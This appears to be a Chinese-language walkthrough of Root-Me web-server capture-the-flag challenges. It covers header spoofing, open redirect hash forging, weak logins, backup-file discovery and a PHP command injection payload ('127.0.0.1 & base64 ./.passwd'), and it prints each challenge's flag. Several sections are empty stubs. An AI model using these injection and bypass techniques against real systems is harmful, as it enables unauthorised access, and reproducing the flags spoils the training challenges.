# Web - Server

## HTML - Source code

目标：找到密码。

访问页面：http://challenge01.root-me.org/web-serveur/ch1/

右键查看源代码，发现 passwd 在 html 代码注释中：password : `nZ^&@q5&sjJHev0`

## HTTP - IP restriction bypass

目标：使用内部网络连接内网服务器。

挑战页面：http://challenge01.root-me.org/web-serveur/ch68/

需要在拦截 http 请求，在 header 中设置 X-Forwarded-For:值为内网的 IP，才可以访问。修改成 127.0.0.1 后，页面得到提示：Your IP 127.0.0.1 do not belong to the LAN.看样子 127.0.0.1 不是内网的 ip，尝试在换个其他的内网 IP。

改成 192.168.1.2 后，得到了最终的 password：`Ip_$po0Fing`

## HTTP - Open redirect

目标：找到一种方法来重定向到网页上显示的域以外的域。

挑战页面：http://challenge01.root-me.org/web-serveur/ch52/

看到挑战页面上第一个跳转连接：http://challenge01.root-me.org/web-serveur/ch52/?url=https://facebook.com&h=a023cfbf5f1c39bdf8407f28b60cd134

看上去 url 提供了一个输入链接的地方，修改成https://www.baidu.com 后再次访问，提示 Incorrect hash!。看样子后面的 h 参数是前面 url 参数值的哈希，进行验证 https://facebook.com 的 md5 值果然是 a023cfbf5f1c39bdf8407f28b60cd134。所以计算https://www.baidu.com的对应md5值为：f9751de431104b125f48dd79cc55822a

修改页面上的 html 元素值，替换成为：?url=https://www.baidu.com&h=f9751de431104b125f48dd79cc55822a，然后使用BP抓包，拦截返回的请求，得到了最终的flag。

进行访问得到：Well done, the flag is `e6f8a530811d5a479812d7b82fc1a5c5`

## HTTP - User-agent

目标：修改 User-Agent

挑战页面：http://challenge01.root-me.org/web-serveur/ch2/

使用 HackBar 将 User-Agent 设置为 admin，最终获得 Password: `rr$Li9%L34qd1AAe27`

## Weak password

目标：弱密码探测

挑战页面：http://challenge01.root-me.org/web-serveur/ch3/

用户名:密码是: `admin:admin`

## PHP - Command injection

目标：RCE

挑战页面：http://challenge01.root-me.org/web-serveur/ch54/index.php

输入框中填写：127.0.0.1 & base64 ./index.php

获得了 index.php 的 base64 编码，然后进行解码，得到 Password：

```php
PGh0bWw+CjxoZWFkPgo8dGl0bGU+UGluZyBTZXJ2aWNlPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4K
PGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249ImluZGV4LnBocCI+CiAgICAgICAgPGlucHV0IHR5
cGU9InRleHQiIG5hbWU9ImlwIiBwbGFjZWhvbGRlcj0iMTI3LjAuMC4xIj4KICAgICAgICA8aW5w
dXQgdHlwZT0ic3VibWl0Ij4KPC9mb3JtPgo8cHJlPgo8P3BocCAKJGZsYWcgPSAiIi5maWxlX2dl
dF9jb250ZW50cygiLnBhc3N3ZCIpLiIiOwppZihpc3NldCgkX1BPU1RbImlwIl0pICYmICFlbXB0
eSgkX1BPU1RbImlwIl0pKXsKICAgICAgICAkcmVzcG9uc2UgPSBzaGVsbF9leGVjKCJ0aW1lb3V0
IC1rIDUgNSBiYXNoIC1jICdwaW5nIC1jIDMgIi4kX1BPU1RbImlwIl0uIiciKTsKICAgICAgICBl
Y2hvICRyZXNwb25zZTsKfQo/Pgo8L3ByZT4KPC9ib2R5Pgo8L2h0bWw+Cgo=

<?php
$flag = "".file_get_contents(".passwd")."";
if(isset($_POST["ip"]) && !empty($_POST["ip"])){
        $response = shell_exec("timeout -k 5 5 bash -c 'ping -c 3 ".$_POST["ip"]."'");
        echo $response;
}
?>
```

继续读取.passwd：

```
127.0.0.1 & base64 ./.passwd

UzNydjFjZVAxbjlTdXAzclMzY3VyZQo=
```

最终得到 Password：`S3rv1ceP1n9Sup3rS3cure`

## API - Broken Access

挑战页面：http://challenge01.root-me.org:59088/

## Backup file

目标：找到备份文件

挑战页面：http://challenge01.root-me.org/web-serveur/ch11/

备份文件可能的后缀名为：.zip、.bak、.tar、~ 等，需要猜测尝试。最终访问：http://challenge01.root-me.org/web-serveur/ch11/index.php~，查看源代码获得用户名和密码：ch11:OCCY9AcNm1tj

获得 flag：`OCCY9AcNm1tj`

## HTTP - Directory indexing

目标：找到隐藏目录

挑战页面：http://challenge01.root-me.org/web-serveur/ch4/

查看页面源代码，看到 html 注释中有隐藏目录：<!-- include("admin/pass.html") -->

访问：http://challenge01.root-me.org/web-serveur/ch4/admin/pass.html ，显示不是这个文件，尝试把 pass.html 去掉，在遍历看看 http://challenge01.root-me.org/web-serveur/ch4/admin/ 终于显示了 backup，http://challenge01.root-me.org/web-serveur/ch4/admin/backup/admin.txt

最终得到 flag：Password / Mot de passe : `LINUX`

## HTTP - Headers

目标：获得管理员权限。

挑战页面：http://challenge01.root-me.org/web-serveur/ch5/

发现新的请求头： Header-Rootme-Admin:none ，在请求中添加新的 header Header-Rootme-Admin:admin

最终获得了 flag：You dit it ! You can validate the challenge with the password `HeadersMayBeUseful`

## HTTP - POST

挑战页面：http://challenge01.root-me.org/web-serveur/ch56/

点击按钮后，用 Bp 抓包，把分数参数改成：1000000，放包后，得到 Password：`H7tp_h4s_N0_s3Cr37S_F0r_y0U`

## HTTP - Improper redirect

挑战页面：http://challenge01.root-me.org/web-serveur/ch32/login.php?redirect

## HTTP - Verb tampering

挑战页面：http://challenge01.root-me.org/web-serveur/ch8/

## Install files

挑战页面：

## API - Mass Assignment

挑战页面：

## CRLF

挑战页面：http://challenge01.root-me.org/web-serveur/ch14/

## File upload - Double extensions

挑战页面：http://challenge01.root-me.org/web-serveur/ch20/
